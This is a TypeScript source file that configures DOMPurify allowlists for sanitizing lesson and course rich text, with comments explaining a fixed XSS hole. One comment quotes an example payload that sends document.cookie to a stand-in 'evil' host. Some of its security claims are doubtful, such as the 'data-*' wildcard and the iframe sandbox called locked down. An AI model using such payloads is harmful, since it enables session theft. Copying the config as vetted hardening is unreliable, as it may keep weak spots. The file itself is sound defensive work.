import DOMPurify from 'dompurify';

// Shared allowlist for lesson/course rich-text content. Used both when a
// teacher/admin saves content (course-builder.api.ts) and at every place
// that content is later rendered via dangerouslySetInnerHTML — sanitizing
// only on save isn't enough, since content saved before this fix (or by a
// future bypass) would otherwise still be rendered unsanitized.
// SECURITY: this allowlist previously included 'script', 'form',
// 'input'/'textarea'/'select', 'link', 'meta' in ALLOWED_TAGS and, far more
// dangerously, 'onclick' in ALLOWED_ATTR. DOMPurify treats an attribute that
// is explicitly listed in ALLOWED_ATTR as trusted and will NOT strip it even
// though it matches its own on*-event-handler blocklist — so any
// teacher/admin-authored (or compromised-account-authored) rich-text block
// could carry e.g. <button onclick="fetch('https://evil/?c='+document.cookie)">
// and have it render, and fire, for every student who opens that lesson/
// assignment. 'link'/'meta' allowed arbitrary stylesheet injection and
// meta-refresh redirects; 'form'/'input' allowed credential-harvesting forms
// that blend into the page. 'script' is dropped too, even though DOMPurify
// does not execute inline <script> content inserted via innerHTML, as
// defense in depth against other render paths (e.g. an editor that
// re-parses this HTML with a real parser, or a future consumer that uses
// outerHTML/document.write instead of dangerouslySetInnerHTML).
//
// 'iframe' is kept — the course-builder PDF-embed block (tiptap-pdf-embed.ts)
// legitimately renders `<iframe data-pdf-embed src="...">` — but every
// iframe that survives sanitization has its `sandbox` attribute forced (see
// the hook below) so embedded content can never navigate/replace the parent
// page, open popups, or submit forms, even if an attacker controlled `src`.
const RICH_TEXT_CONFIG = {
  ALLOWED_TAGS: [
    'p', 'br', 'strong', 'b', 'em', 'i', 'u', 's', 'strike',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'ul', 'ol', 'li', 'blockquote', 'a', 'img',
    'table', 'thead', 'tbody', 'tr', 'th', 'td',
    'span', 'div', 'code', 'pre', 'hr',
    // Rich custom templates (dialogue boxes, flashcards, styled cards)
    'style', 'section', 'article', 'header', 'footer', 'main', 'nav', 'aside',
    'figure', 'figcaption', 'details', 'summary', 'mark', 'time',
    'dl', 'dt', 'dd', 'abbr', 'address', 'cite', 'q',
    'small', 'sub', 'sup', 'wbr', 'picture', 'source',
    'button', 'svg', 'path', 'circle', 'rect', 'line', 'polyline', 'polygon',
    'g', 'defs', 'linearGradient', 'stop', 'text', 'tspan',
    'audio', 'video', 'source', 'track',
    'label', 'iframe',
  ],
  ALLOWED_ATTR: [
    'href', 'src', 'alt', 'title', 'class', 'target', 'rel',
    'colspan', 'rowspan', 'style', 'id', 'dir', 'lang',
    'width', 'height', 'loading', 'decoding',
    'start', 'reversed', 'type',
    // Generic data-* attributes — DOMPurify interprets this as "allow any
    // attribute starting with data-" (so data-answer, data-type, data-align,
    // data-label, data-correct, etc. are all permitted).
    'data-*',
    // SVG attributes for inline vector graphics
    'viewBox', 'd', 'fill', 'stroke', 'stroke-width', 'stroke-linecap',
    'cx', 'cy', 'r', 'x', 'y', 'x1', 'y1', 'x2', 'y2',
    'transform', 'opacity', 'fill-opacity',
    // Non-interactive presentational attributes only — no event handlers
    // (onclick/onerror/onload/...) are ever allowed here; see note above.
    'placeholder', 'disabled', 'checked', 'selected',
    'readonly', 'autoplay', 'controls', 'muted', 'loop',
    'poster', 'playsinline',
    // iframe (pdf-embed block only)
    'frameborder', 'allowfullscreen', 'sandbox',
    // Misc
    'name', 'value', 'for', 'role', 'aria-label', 'aria-hidden',
    'tabindex',
    'crossorigin', 'referrerpolicy',
  ],
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|data):|[^a-z]|[a-z+.-]+(?:[^a-z+.:-]|$))/i,
  ALLOW_DATA_ATTR: false,
};

// Force every surviving <iframe> into a locked-down sandbox regardless of
// any sandbox value the source HTML tried to set: no script-driven
// top-level navigation, no popups, no form submission, no pointer lock.
// allow-scripts+allow-same-origin is still needed for PDF viewers (browser
// built-in PDF renderer) to actually render the document.
DOMPurify.addHook('uponSanitizeElement', (node, data) => {
  if (data.tagName === 'iframe' && node instanceof Element) {
    node.setAttribute('sandbox', 'allow-scripts allow-same-origin');
    node.setAttribute('referrerpolicy', 'no-referrer');
  }
});

export function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty || '', RICH_TEXT_CONFIG);
}

// Separate, more permissive config for content that will ONLY ever be
// rendered inside components/shared/html-preview.tsx's doubly-isolated
// `<iframe sandbox="allow-scripts">` (no allow-same-origin, no allow-forms,
// no allow-top-navigation, no allow-popups). That isolation — not the HTML
// allowlist — is what makes it safe to allow 'script'/'iframe'/'form'/
// 'input'/'link'/'meta'/onclick there: a script running inside that frame
// cannot read the parent's cookies/localStorage/DOM, submit a form,
// navigate the top-level page, or open a popup, so it is no more dangerous
// than any other same-sandbox JS. NEVER use this config for content that
// will be rendered via dangerouslySetInnerHTML directly into the host page
// (use `sanitizeHtml` above for that) — doing so would reintroduce the
// onclick/script-tag XSS this file was hardened against.
const SANDBOXED_FRAME_CONFIG = {
  ...RICH_TEXT_CONFIG,
  ALLOWED_TAGS: [...RICH_TEXT_CONFIG.ALLOWED_TAGS, 'script', 'link', 'meta', 'form', 'input', 'textarea', 'select', 'option'],
  ALLOWED_ATTR: [...RICH_TEXT_CONFIG.ALLOWED_ATTR, 'onclick', 'async', 'defer', 'integrity', 'charset', 'http-equiv', 'content', 'property', 'action', 'method'],
};

export function sanitizeHtmlForSandboxedFrame(dirty: string): string {
  return DOMPurify.sanitize(dirty || '', SANDBOXED_FRAME_CONFIG);
}
